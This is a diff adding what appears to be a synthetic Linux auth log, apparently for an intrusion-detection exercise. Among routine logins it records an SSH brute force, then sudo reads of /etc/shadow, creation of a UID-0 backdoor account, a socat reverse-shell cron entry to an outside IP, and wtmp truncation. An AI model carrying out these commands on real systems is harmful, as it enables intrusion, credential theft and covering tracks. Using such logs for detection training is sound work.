@@ -1,0 +1,207 @@
+Sep 11 21:43:05 svr-app01 sudo[20000]: s.pemberton : TTY=pts/1 ; PWD=/home/s.pemberton ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 11 21:44:02 svr-app01 sshd[20001]: Accepted publickey for a.brennan from 10.20.4.34 port 41900 ssh2: RSA SHA256:h3KdcQ
+Sep 11 21:44:02 svr-app01 systemd-logind[20002]: New session 319 of user a.brennan.
+Sep 11 21:44:41 svr-app01 sshd[20003]: Accepted publickey for j.okafor from 10.20.4.44 port 47886 ssh2: RSA SHA256:h3KdaQ
+Sep 11 21:44:41 svr-app01 systemd-logind[20004]: New session 664 of user j.okafor.
+Sep 11 21:48:38 svr-app01 CRON[20005]: (www-data) CMD (php /var/www/app/artisan schedule:run)
+Sep 11 21:54:20 svr-app01 CRON[20006]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 11 21:58:03 svr-app01 sshd[20007]: Accepted publickey for j.okafor from 10.20.4.38 port 44363 ssh2: RSA SHA256:h3KdbQ
+Sep 11 21:58:03 svr-app01 systemd-logind[20008]: New session 529 of user j.okafor.
+Sep 11 21:59:36 svr-app01 CRON[20009]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 11 22:04:42 svr-app01 sshd[20010]: Accepted publickey for t.novak from 10.20.4.36 port 58717 ssh2: RSA SHA256:h3KdZQ
+Sep 11 22:04:42 svr-app01 systemd-logind[20011]: New session 292 of user t.novak.
+Sep 11 22:08:12 svr-app01 CRON[20012]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 11 22:13:48 svr-app01 sudo[20013]: s.pemberton : TTY=pts/1 ; PWD=/home/s.pemberton ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 11 22:17:46 svr-app01 CRON[20014]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 11 22:21:58 svr-app01 sshd[20015]: Accepted publickey for r.whitlock from 10.20.4.40 port 45890 ssh2: RSA SHA256:h3KdZQ
+Sep 11 22:21:58 svr-app01 systemd-logind[20016]: New session 898 of user r.whitlock.
+Sep 11 22:24:22 svr-app01 CRON[20017]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 11 22:27:37 svr-app01 sshd[20018]: Accepted publickey for t.novak from 10.20.4.45 port 42398 ssh2: RSA SHA256:h3KdaQ
+Sep 11 22:27:37 svr-app01 systemd-logind[20019]: New session 624 of user t.novak.
+Sep 11 22:31:31 svr-app01 sshd[20020]: Accepted publickey for s.pemberton from 10.20.4.41 port 56022 ssh2: RSA SHA256:h3KdYQ
+Sep 11 22:31:31 svr-app01 systemd-logind[20021]: New session 140 of user s.pemberton.
+Sep 11 22:37:33 svr-app01 sshd[20022]: Accepted publickey for j.okafor from 10.20.4.41 port 51474 ssh2: RSA SHA256:h3KdcQ
+Sep 11 22:37:33 svr-app01 systemd-logind[20023]: New session 608 of user j.okafor.
+Sep 11 22:42:49 svr-app01 sshd[20024]: Received disconnect from 10.20.4.33 port 48845:11: disconnected by user
+Sep 11 22:47:11 svr-app01 sshd[20025]: Accepted publickey for t.novak from 10.20.4.33 port 50145 ssh2: RSA SHA256:h3KdZQ
+Sep 11 22:47:11 svr-app01 systemd-logind[20026]: New session 691 of user t.novak.
+Sep 11 22:52:02 svr-app01 sshd[20102]: Invalid user root from 185.243.96.114 port 52530
+Sep 11 22:52:02 svr-app01 sshd[20103]: Failed password for invalid user root from 185.243.96.114 port 55999 ssh2
+Sep 11 22:52:05 svr-app01 sshd[20104]: Invalid user admin from 185.243.96.114 port 54146
+Sep 11 22:52:05 svr-app01 sshd[20105]: Failed password for invalid user admin from 185.243.96.114 port 52248 ssh2
+Sep 11 22:52:10 svr-app01 sshd[20106]: Invalid user oracle from 185.243.96.114 port 53597
+Sep 11 22:52:10 svr-app01 sshd[20107]: Failed password for invalid user oracle from 185.243.96.114 port 51542 ssh2
+Sep 11 22:52:15 svr-app01 sshd[20108]: Invalid user postgres from 185.243.96.114 port 57983
+Sep 11 22:52:15 svr-app01 sshd[20109]: Failed password for invalid user postgres from 185.243.96.114 port 52667 ssh2
+Sep 11 22:52:18 svr-app01 sshd[20110]: Invalid user ubuntu from 185.243.96.114 port 52645
+Sep 11 22:52:18 svr-app01 sshd[20111]: Failed password for invalid user ubuntu from 185.243.96.114 port 57070 ssh2
+Sep 11 22:52:24 svr-app01 sshd[20112]: Invalid user test from 185.243.96.114 port 56616
+Sep 11 22:52:24 svr-app01 sshd[20113]: Failed password for invalid user test from 185.243.96.114 port 55556 ssh2
+Sep 11 22:52:29 svr-app01 sshd[20114]: Invalid user git from 185.243.96.114 port 53207
+Sep 11 22:52:29 svr-app01 sshd[20115]: Failed password for invalid user git from 185.243.96.114 port 55842 ssh2
+Sep 11 22:52:33 svr-app01 sshd[20116]: Invalid user jenkins from 185.243.96.114 port 51510
+Sep 11 22:52:33 svr-app01 sshd[20117]: Failed password for invalid user jenkins from 185.243.96.114 port 55995 ssh2
+Sep 11 22:53:19 svr-app01 sudo[20027]: d.mensah : TTY=pts/1 ; PWD=/home/d.mensah ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 11 22:56:34 svr-app01 sshd[20118]: Failed password for svc_backup from 185.243.96.114 port 55537 ssh2
+Sep 11 22:56:38 svr-app01 sshd[20119]: Failed password for svc_backup from 185.243.96.114 port 57216 ssh2
+Sep 11 22:56:39 svr-app01 sshd[20120]: Failed password for svc_backup from 185.243.96.114 port 56297 ssh2
+Sep 11 22:56:42 svr-app01 sshd[20121]: Failed password for svc_backup from 185.243.96.114 port 58477 ssh2
+Sep 11 22:56:45 svr-app01 sshd[20122]: Failed password for svc_backup from 185.243.96.114 port 58392 ssh2
+Sep 11 22:56:46 svr-app01 sshd[20123]: Failed password for svc_backup from 185.243.96.114 port 51848 ssh2
+Sep 11 22:56:48 svr-app01 sshd[20124]: Failed password for svc_backup from 185.243.96.114 port 51716 ssh2
+Sep 11 22:56:49 svr-app01 sshd[20125]: Failed password for svc_backup from 185.243.96.114 port 54351 ssh2
+Sep 11 22:56:52 svr-app01 sshd[20126]: Failed password for svc_backup from 185.243.96.114 port 50648 ssh2
+Sep 11 22:56:52 svr-app01 sshd[20127]: error: maximum authentication attempts exceeded for svc_backup from 185.243.96.114 port 52974 ssh2 [preauth]
+Sep 11 22:56:55 svr-app01 sshd[20128]: Failed password for svc_backup from 185.243.96.114 port 52122 ssh2
+Sep 11 22:56:59 svr-app01 sshd[20129]: Failed password for svc_backup from 185.243.96.114 port 54237 ssh2
+Sep 11 22:57:03 svr-app01 sshd[20130]: Failed password for svc_backup from 185.243.96.114 port 52447 ssh2
+Sep 11 22:57:07 svr-app01 sshd[20131]: Failed password for svc_backup from 185.243.96.114 port 55358 ssh2
+Sep 11 22:57:08 svr-app01 sshd[20132]: Failed password for svc_backup from 185.243.96.114 port 54572 ssh2
+Sep 11 22:57:09 svr-app01 sshd[20133]: Failed password for svc_backup from 185.243.96.114 port 53003 ssh2
+Sep 11 22:57:13 svr-app01 sshd[20134]: Failed password for svc_backup from 185.243.96.114 port 51186 ssh2
+Sep 11 22:57:16 svr-app01 sshd[20135]: Failed password for svc_backup from 185.243.96.114 port 50275 ssh2
+Sep 11 22:57:17 svr-app01 sshd[20136]: Failed password for svc_backup from 185.243.96.114 port 54268 ssh2
+Sep 11 22:57:17 svr-app01 sshd[20137]: error: maximum authentication attempts exceeded for svc_backup from 185.243.96.114 port 51372 ssh2 [preauth]
+Sep 11 22:57:19 svr-app01 sshd[20138]: Failed password for svc_backup from 185.243.96.114 port 51091 ssh2
+Sep 11 22:57:22 svr-app01 sshd[20139]: Failed password for svc_backup from 185.243.96.114 port 51993 ssh2
+Sep 11 22:57:26 svr-app01 sshd[20140]: Failed password for svc_backup from 185.243.96.114 port 50189 ssh2
+Sep 11 22:57:29 svr-app01 sshd[20141]: Failed password for svc_backup from 185.243.96.114 port 59061 ssh2
+Sep 11 22:57:33 svr-app01 sshd[20142]: Failed password for svc_backup from 185.243.96.114 port 54388 ssh2
+Sep 11 22:57:35 svr-app01 sshd[20143]: Failed password for svc_backup from 185.243.96.114 port 50707 ssh2
+Sep 11 22:57:37 svr-app01 sshd[20144]: Failed password for svc_backup from 185.243.96.114 port 51793 ssh2
+Sep 11 22:57:39 svr-app01 sshd[20145]: Failed password for svc_backup from 185.243.96.114 port 54290 ssh2
+Sep 11 22:57:40 svr-app01 sshd[20146]: Failed password for svc_backup from 185.243.96.114 port 52967 ssh2
+Sep 11 22:57:40 svr-app01 sshd[20147]: error: maximum authentication attempts exceeded for svc_backup from 185.243.96.114 port 53305 ssh2 [preauth]
+Sep 11 22:57:43 svr-app01 sshd[20148]: Failed password for svc_backup from 185.243.96.114 port 54997 ssh2
+Sep 11 22:57:45 svr-app01 sshd[20149]: Failed password for svc_backup from 185.243.96.114 port 54750 ssh2
+Sep 11 22:57:49 svr-app01 sshd[20150]: Failed password for svc_backup from 185.243.96.114 port 58193 ssh2
+Sep 11 22:57:51 svr-app01 sshd[20151]: Failed password for svc_backup from 185.243.96.114 port 54432 ssh2
+Sep 11 22:57:54 svr-app01 sshd[20152]: Failed password for svc_backup from 185.243.96.114 port 50297 ssh2
+Sep 11 22:57:57 svr-app01 sshd[20153]: Failed password for svc_backup from 185.243.96.114 port 50605 ssh2
+Sep 11 22:57:58 svr-app01 sshd[20154]: Failed password for svc_backup from 185.243.96.114 port 50302 ssh2
+Sep 11 22:58:01 svr-app01 sshd[20155]: Accepted password for svc_backup from 185.243.96.114 port 51944 ssh2
+Sep 11 22:58:01 svr-app01 systemd-logind[20156]: New session 4471 of user svc_backup.
+Sep 11 22:58:49 svr-app01 sudo[20157]: svc_backup : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/apt-get install -y socat
+Sep 11 22:59:20 svr-app01 sudo[20158]: svc_backup : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Sep 11 22:59:21 svr-app01 CRON[20028]: (www-data) CMD (php /var/www/app/artisan schedule:run)
+Sep 11 22:59:46 svr-app01 useradd[20159]: new user: name=sysmon-svc, UID=0, GID=0, home=/home/sysmon-svc, shell=/bin/bash
+Sep 11 22:59:48 svr-app01 CRON[20165]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 22:59:55 svr-app01 passwd[20160]: password changed for sysmon-svc
+Sep 11 23:00:59 svr-app01 sshd[20161]: Accepted publickey for sysmon-svc from 185.243.96.114 port 52310 ssh2: RSA SHA256:9pQm4T2vLxBnF7dCe1Ws0YgHkJ
+Sep 11 23:00:59 svr-app01 systemd-logind[20162]: New session 4473 of user sysmon-svc.
+Sep 11 23:02:23 svr-app01 CRON[20166]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:02:42 svr-app01 CRON[20029]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 11 23:02:59 svr-app01 CRON[20163]: (sysmon-svc) CMD (/usr/bin/socat TCP:45.147.230.19:8443 EXEC:/bin/bash,pty,stderr &)
+Sep 11 23:03:54 svr-app01 sudo[20164]: sysmon-svc : TTY=pts/4 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/wtmp
+Sep 11 23:04:53 svr-app01 sshd[20030]: Failed password for r.whitlock from 10.20.4.35 port 53038 ssh2
+Sep 11 23:06:34 svr-app01 CRON[20167]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:08:33 svr-app01 sshd[20031]: Accepted publickey for d.mensah from 10.20.4.33 port 53161 ssh2: RSA SHA256:h3KdcQ
+Sep 11 23:08:33 svr-app01 systemd-logind[20032]: New session 384 of user d.mensah.
+Sep 11 23:10:03 svr-app01 sudo[20033]: d.mensah : TTY=pts/1 ; PWD=/home/d.mensah ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 11 23:10:25 svr-app01 CRON[20168]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:12:52 svr-app01 CRON[20169]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:13:26 svr-app01 CRON[20034]: (www-data) CMD (php /var/www/app/artisan schedule:run)
+Sep 11 23:14:33 svr-app01 CRON[20170]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:15:03 svr-app01 sshd[20035]: Accepted publickey for j.okafor from 10.20.4.36 port 47645 ssh2: RSA SHA256:h3KdaQ
+Sep 11 23:15:03 svr-app01 systemd-logind[20036]: New session 596 of user j.okafor.
+Sep 11 23:16:09 svr-app01 CRON[20171]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:18:49 svr-app01 sshd[20172]: Accepted publickey for d.mensah from 10.20.4.36 port 52480 ssh2: RSA SHA256:h3KdQc
+Sep 11 23:20:24 svr-app01 sshd[20037]: Accepted publickey for s.pemberton from 10.20.4.39 port 44773 ssh2: RSA SHA256:h3KdYQ
+Sep 11 23:20:24 svr-app01 systemd-logind[20038]: New session 647 of user s.pemberton.
+Sep 11 23:21:43 svr-app01 CRON[20173]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:22:36 svr-app01 sshd[20174]: Accepted publickey for d.mensah from 10.20.4.36 port 54608 ssh2: RSA SHA256:h3KdQa
+Sep 11 23:23:53 svr-app01 CRON[20039]: (www-data) CMD (php /var/www/app/artisan schedule:run)
+Sep 11 23:25:20 svr-app01 CRON[20175]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:28:35 svr-app01 CRON[20176]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:30:06 svr-app01 CRON[20040]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 11 23:31:43 svr-app01 sshd[20177]: Accepted publickey for s.pemberton from 10.20.4.42 port 50988 ssh2: RSA SHA256:h3KdQY
+Sep 11 23:32:55 svr-app01 CRON[20178]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:35:07 svr-app01 CRON[20179]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:36:14 svr-app01 sshd[20041]: Accepted publickey for a.brennan from 10.20.4.43 port 52914 ssh2: RSA SHA256:h3KdaQ
+Sep 11 23:36:14 svr-app01 systemd-logind[20042]: New session 593 of user a.brennan.
+Sep 11 23:36:23 svr-app01 sshd[20180]: Accepted publickey for r.whitlock from 10.20.4.33 port 59228 ssh2: RSA SHA256:h3KdQa
+Sep 11 23:40:14 svr-app01 sshd[20181]: Accepted publickey for j.okafor from 10.20.4.40 port 47628 ssh2: RSA SHA256:h3KdQa
+Sep 11 23:41:58 svr-app01 sshd[20043]: Accepted publickey for d.mensah from 10.20.4.32 port 46840 ssh2: RSA SHA256:h3KdYQ
+Sep 11 23:41:58 svr-app01 systemd-logind[20044]: New session 266 of user d.mensah.
+Sep 11 23:43:14 svr-app01 sshd[20045]: Accepted publickey for r.whitlock from 10.20.4.32 port 58572 ssh2: RSA SHA256:h3KdXQ
+Sep 11 23:43:14 svr-app01 systemd-logind[20046]: New session 649 of user r.whitlock.
+Sep 11 23:44:25 svr-app01 sshd[20047]: Accepted publickey for r.whitlock from 10.20.4.31 port 46814 ssh2: RSA SHA256:h3KdcQ
+Sep 11 23:44:25 svr-app01 systemd-logind[20048]: New session 485 of user r.whitlock.
+Sep 11 23:45:00 svr-app01 sshd[20205]: Accepted publickey for d.mensah from 10.20.9.77 port 49911 ssh2: RSA SHA256:h3KdQaX
+Sep 11 23:45:14 svr-app01 CRON[20182]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:45:40 svr-app01 sudo[20206]: d.mensah : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/tail -n 200 /var/log/nginx/error.log
+Sep 11 23:46:01 svr-app01 CRON[20049]: (www-data) CMD (php /var/www/app/artisan schedule:run)
+Sep 11 23:49:57 svr-app01 CRON[20183]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:51:29 svr-app01 sshd[20050]: Accepted publickey for r.whitlock from 10.20.4.46 port 55993 ssh2: RSA SHA256:h3KdYQ
+Sep 11 23:51:29 svr-app01 systemd-logind[20051]: New session 591 of user r.whitlock.
+Sep 11 23:51:41 svr-app01 CRON[20184]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:55:56 svr-app01 sshd[20052]: Accepted publickey for r.whitlock from 10.20.4.33 port 51227 ssh2: RSA SHA256:h3KdZQ
+Sep 11 23:55:56 svr-app01 systemd-logind[20053]: New session 371 of user r.whitlock.
+Sep 11 23:56:29 svr-app01 CRON[20185]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 11 23:57:07 svr-app01 sshd[20186]: Accepted publickey for t.novak from 10.20.4.38 port 41371 ssh2: RSA SHA256:h3KdQX
+Sep 12 00:00:21 svr-app01 CRON[20054]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 12 00:00:41 svr-app01 CRON[20187]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 12 00:01:36 svr-app01 CRON[20188]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 12 00:02:26 svr-app01 sshd[20055]: Accepted publickey for a.brennan from 10.20.4.42 port 57798 ssh2: RSA SHA256:h3KdaQ
+Sep 12 00:02:26 svr-app01 systemd-logind[20056]: New session 876 of user a.brennan.
+Sep 12 00:04:11 svr-app01 sshd[20189]: Accepted publickey for d.mensah from 10.20.4.39 port 42297 ssh2: RSA SHA256:h3KdQZ
+Sep 12 00:07:16 svr-app01 sudo[20057]: r.whitlock : TTY=pts/1 ; PWD=/home/r.whitlock ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 12 00:08:58 svr-app01 CRON[20190]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 12 00:09:49 svr-app01 CRON[20058]: (www-data) CMD (php /var/www/app/artisan schedule:run)
+Sep 12 00:10:01 svr-app01 sshd[20191]: Accepted publickey for t.novak from 10.20.4.46 port 42439 ssh2: RSA SHA256:h3KdQb
+Sep 12 00:12:31 svr-app01 sshd[20192]: Accepted publickey for t.novak from 10.20.4.37 port 55084 ssh2: RSA SHA256:h3KdQY
+Sep 12 00:13:11 svr-app01 sshd[20059]: Accepted publickey for s.pemberton from 10.20.4.47 port 47308 ssh2: RSA SHA256:h3KdcQ
+Sep 12 00:13:11 svr-app01 systemd-logind[20060]: New session 876 of user s.pemberton.
+Sep 12 00:15:10 svr-app01 sshd[20061]: Failed password for s.pemberton from 10.20.4.43 port 47429 ssh2
+Sep 12 00:16:16 svr-app01 CRON[20193]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 12 00:17:12 svr-app01 sshd[20062]: Accepted publickey for a.brennan from 10.20.4.46 port 40949 ssh2: RSA SHA256:h3KdaQ
+Sep 12 00:17:12 svr-app01 systemd-logind[20063]: New session 386 of user a.brennan.
+Sep 12 00:19:13 svr-app01 sshd[20194]: Accepted publickey for j.okafor from 10.20.4.37 port 44830 ssh2: RSA SHA256:h3KdQb
+Sep 12 00:21:33 svr-app01 sudo[20064]: r.whitlock : TTY=pts/1 ; PWD=/home/r.whitlock ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 12 00:21:53 svr-app01 CRON[20195]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 12 00:23:31 svr-app01 sshd[20196]: Accepted publickey for j.okafor from 10.20.4.46 port 48807 ssh2: RSA SHA256:h3KdQZ
+Sep 12 00:24:49 svr-app01 CRON[20065]: (www-data) CMD (php /var/www/app/artisan schedule:run)
+Sep 12 00:24:51 svr-app01 CRON[20197]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 12 00:27:49 svr-app01 sshd[20198]: Accepted publickey for t.novak from 10.20.4.47 port 55266 ssh2: RSA SHA256:h3KdQY
+Sep 12 00:28:15 svr-app01 sshd[20066]: Accepted publickey for j.okafor from 10.20.4.38 port 55403 ssh2: RSA SHA256:h3KdXQ
+Sep 12 00:28:15 svr-app01 systemd-logind[20067]: New session 445 of user j.okafor.
+Sep 12 00:29:19 svr-app01 sshd[20199]: Accepted publickey for a.brennan from 10.20.4.37 port 42813 ssh2: RSA SHA256:h3KdQY
+Sep 12 00:29:57 svr-app01 sshd[20200]: Accepted publickey for r.whitlock from 10.20.4.45 port 56600 ssh2: RSA SHA256:h3KdQY
+Sep 12 00:30:19 svr-app01 CRON[20068]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 12 00:32:44 svr-app01 CRON[20201]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 12 00:35:01 svr-app01 sshd[20202]: Accepted publickey for j.okafor from 10.20.4.33 port 57172 ssh2: RSA SHA256:h3KdQb
+Sep 12 00:36:13 svr-app01 sshd[20069]: Received disconnect from 10.20.4.33 port 43929:11: disconnected by user
+Sep 12 00:38:35 svr-app01 sshd[20203]: Accepted publickey for s.pemberton from 10.20.4.47 port 43692 ssh2: RSA SHA256:h3KdQZ
+Sep 12 00:39:51 svr-app01 CRON[20070]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 12 00:41:42 svr-app01 sshd[20071]: Accepted publickey for d.mensah from 10.20.4.41 port 52970 ssh2: RSA SHA256:h3KdYQ
+Sep 12 00:41:42 svr-app01 systemd-logind[20072]: New session 511 of user d.mensah.
+Sep 12 00:42:11 svr-app01 CRON[20204]: (root) CMD (/usr/local/bin/metrics-push.sh)
+Sep 12 00:48:22 svr-app01 sshd[20073]: Accepted publickey for j.okafor from 10.20.4.36 port 44162 ssh2: RSA SHA256:h3KdaQ
+Sep 12 00:48:22 svr-app01 systemd-logind[20074]: New session 254 of user j.okafor.
+Sep 12 00:53:44 svr-app01 sudo[20075]: d.mensah : TTY=pts/1 ; PWD=/home/d.mensah ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 12 00:59:09 svr-app01 sshd[20076]: Accepted publickey for d.mensah from 10.20.4.42 port 57966 ssh2: RSA SHA256:h3KdXQ
+Sep 12 00:59:09 svr-app01 systemd-logind[20077]: New session 121 of user d.mensah.
+Sep 12 00:59:36 svr-app01 CRON[20078]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 12 01:01:07 svr-app01 sshd[20079]: Received disconnect from 10.20.4.37 port 46915:11: disconnected by user
+Sep 12 01:01:41 svr-app01 sshd[20080]: Accepted publickey for r.whitlock from 10.20.4.37 port 47881 ssh2: RSA SHA256:h3KdcQ
+Sep 12 01:01:41 svr-app01 systemd-logind[20081]: New session 433 of user r.whitlock.
+Sep 12 01:04:13 svr-app01 sshd[20082]: Received disconnect from 10.20.4.44 port 41995:11: disconnected by user
+Sep 12 01:10:51 svr-app01 sudo[20083]: r.whitlock : TTY=pts/1 ; PWD=/home/r.whitlock ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 12 01:15:35 svr-app01 sshd[20084]: Accepted publickey for d.mensah from 10.20.4.47 port 44975 ssh2: RSA SHA256:h3KdcQ
+Sep 12 01:15:35 svr-app01 systemd-logind[20085]: New session 622 of user d.mensah.
+Sep 12 01:16:04 svr-app01 sudo[20086]: d.mensah : TTY=pts/1 ; PWD=/home/d.mensah ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 12 01:17:40 svr-app01 CRON[20087]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 12 01:24:11 svr-app01 sshd[20088]: Accepted publickey for j.okafor from 10.20.4.32 port 56985 ssh2: RSA SHA256:h3KdcQ
+Sep 12 01:24:11 svr-app01 systemd-logind[20089]: New session 668 of user j.okafor.
+Sep 12 01:28:38 svr-app01 sshd[20090]: Accepted publickey for j.okafor from 10.20.4.32 port 49074 ssh2: RSA SHA256:h3KdaQ
+Sep 12 01:28:38 svr-app01 systemd-logind[20091]: New session 890 of user j.okafor.
+Sep 12 01:29:48 svr-app01 CRON[20092]: (root) CMD (/usr/local/bin/backup-rotate.sh)
+Sep 12 01:30:40 svr-app01 sudo[20093]: d.mensah : TTY=pts/1 ; PWD=/home/d.mensah ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 12 01:35:18 svr-app01 sshd[20094]: Accepted publickey for a.brennan from 10.20.4.47 port 49082 ssh2: RSA SHA256:h3KdYQ
+Sep 12 01:35:18 svr-app01 systemd-logind[20095]: New session 620 of user a.brennan.
+Sep 12 01:40:11 svr-app01 CRON[20096]: (www-data) CMD (php /var/www/app/artisan schedule:run)
+Sep 12 01:46:28 svr-app01 CRON[20097]: (www-data) CMD (php /var/www/app/artisan schedule:run)
+Sep 12 01:48:31 svr-app01 sshd[20098]: Accepted publickey for d.mensah from 10.20.4.35 port 52856 ssh2: RSA SHA256:h3KdYQ
+Sep 12 01:48:31 svr-app01 systemd-logind[20099]: New session 423 of user d.mensah.
+Sep 12 01:49:28 svr-app01 sshd[20100]: Accepted publickey for t.novak from 10.20.4.38 port 46969 ssh2: RSA SHA256:h3KdZQ
+Sep 12 01:49:28 svr-app01 systemd-logind[20101]: New session 410 of user t.novak.
